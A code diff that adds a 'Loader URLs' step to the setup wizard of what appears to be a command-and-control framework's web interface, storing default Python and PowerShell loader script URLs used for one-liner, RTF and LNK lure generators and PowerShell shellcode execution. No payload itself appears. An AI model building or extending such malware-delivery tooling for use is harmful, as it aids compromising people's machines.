@@ -1,6 +1,7 @@
 @inject CacheManager Cache
 @inject RelayStore Relay
 @inject ExtensionGroupStore ExtGroups
+@inject LoaderStore Loaders
 @inject MessageService Msg
 
 <div class="su">
@@ -192,6 +193,29 @@
                     <p class="su-hint">At least one enabled relay is required to continue.</p>
                 }
             }
+            else if (step == Step.Loaders)
+            {
+                <h2 class="su-title">Loader URLs</h2>
+                <p class="su-desc">Configure the default loader script URLs. These are used across all loader generators (one-liners, RTF, LNK). You can change them later from each loader panel.</p>
+
+                <div class="su-form">
+                    <div class="su-field">
+                        <label class="su-label">Python Loader URL</label>
+                        <C2Input @bind-Value="pythonLoaderUrl" Size="Size.Md" Monospace Placeholder="@LoaderStore.DefaultPythonUrl" />
+                        <span class="su-field-hint">Cross-platform loader — runs on Windows, Linux, macOS, Android</span>
+                    </div>
+                    <div class="su-field">
+                        <label class="su-label">PowerShell Loader URL</label>
+                        <C2Input @bind-Value="powershellLoaderUrl" Size="Size.Md" Monospace Placeholder="@LoaderStore.DefaultPowerShellUrl" />
+                        <span class="su-field-hint">Windows-only loader — in-process shellcode execution via PowerShell</span>
+                    </div>
+                </div>
+
+                <div class="su-actions">
+                    <C2Btn Variant="BtnVariant.Primary" Size="Size.Lg" OnClick="SaveLoaders" Disabled="@saving" Loading="@saving">Continue</C2Btn>
+                    <C2Btn Size="Size.Md" OnClick="SaveDefaultLoaders" Disabled="@saving">Use Defaults</C2Btn>
+                </div>
+            }
             else if (step == Step.Extensions)
             {
                 <h2 class="su-title">File Extension Groups</h2>
@@ -259,7 +283,7 @@
 @code {
     [Parameter] public EventCallback OnComplete { get; set; }
 
-    private enum Step { Welcome, Cache, Relay, Extensions }
+    private enum Step { Welcome, Cache, Relay, Loaders, Extensions }
 
     private Step step;
     private bool picking;
@@ -274,6 +298,8 @@
     private string customGroupName = "";
     private string customGroupExts = "";
     private string customGroupError = "";
+    private string pythonLoaderUrl = "";
+    private string powershellLoaderUrl = "";
     private List<Step> orderedSteps = [];
 
     private record InfoItem(string Icon, string Title, string Desc);
@@ -306,6 +332,7 @@
         [Step.Welcome] = "Welcome",
         [Step.Cache] = "Cache Storage",
         [Step.Relay] = "Relay Server",
+        [Step.Loaders] = "Loader URLs",
         [Step.Extensions] = "File Extensions",
     };
 
@@ -313,11 +340,13 @@
     {
         var needsCache = Cache.SetupRequired || Cache.NeedsPermission;
         var needsRelay = Relay.SetupRequired;
+        var needsLoaders = Loaders.SetupRequired;
         var needsExtensions = ExtGroups.SetupRequired;
 
         orderedSteps = [Step.Welcome];
         if (needsCache) orderedSteps.Add(Step.Cache);
         if (needsRelay) orderedSteps.Add(Step.Relay);
+        if (needsLoaders) orderedSteps.Add(Step.Loaders);
         if (needsExtensions) orderedSteps.Add(Step.Extensions);
 
         step = Step.Welcome;
@@ -326,6 +355,9 @@
         relayName = enabled?.Name ?? (needsRelay ? RelayStore.DefaultName : "");
         relayUrl = enabled?.Url ?? (needsRelay ? RelayStore.DefaultUrl : "");
         relayToken = enabled?.Token ?? (needsRelay ? RelayStore.DefaultToken : "");
+
+        pythonLoaderUrl = Loaders.PythonLoaderUrl;
+        powershellLoaderUrl = Loaders.PowerShellLoaderUrl;
     }
 
     private static string StepLabel(Step s) => StepLabels.GetValueOrDefault(s, s.ToString());
@@ -461,6 +493,35 @@
         await Relay.RemoveRelay(relay.Url);
         if (editingRelay?.Url == relay.Url) CancelEditRelay();
         StateHasChanged();
+    }
+
+    private async Task SaveLoaders()
+    {
+        saving = true;
+        StateHasChanged();
+        try
+        {
+            var pyUrl = string.IsNullOrWhiteSpace(pythonLoaderUrl) ? LoaderStore.DefaultPythonUrl : pythonLoaderUrl.Trim();
+            var psUrl = string.IsNullOrWhiteSpace(powershellLoaderUrl) ? LoaderStore.DefaultPowerShellUrl : powershellLoaderUrl.Trim();
+            await Loaders.SetUrlAsync(LoaderStore.PythonKey, pyUrl);
+            await Loaders.SetUrlAsync(LoaderStore.PowerShellKey, psUrl);
+            Advance();
+        }
+        catch (Exception ex) { Msg.Error("Save Loaders Failed", ex.Message, "Setup"); }
+        finally { saving = false; }
+    }
+
+    private async Task SaveDefaultLoaders()
+    {
+        saving = true;
+        StateHasChanged();
+        try
+        {
+            await Loaders.SaveDefaultsAsync();
+            Advance();
+        }
+        catch (Exception ex) { Msg.Error("Save Loaders Failed", ex.Message, "Setup"); }
+        finally { saving = false; }
     }
 
     private void ToggleExtGroup(string name)
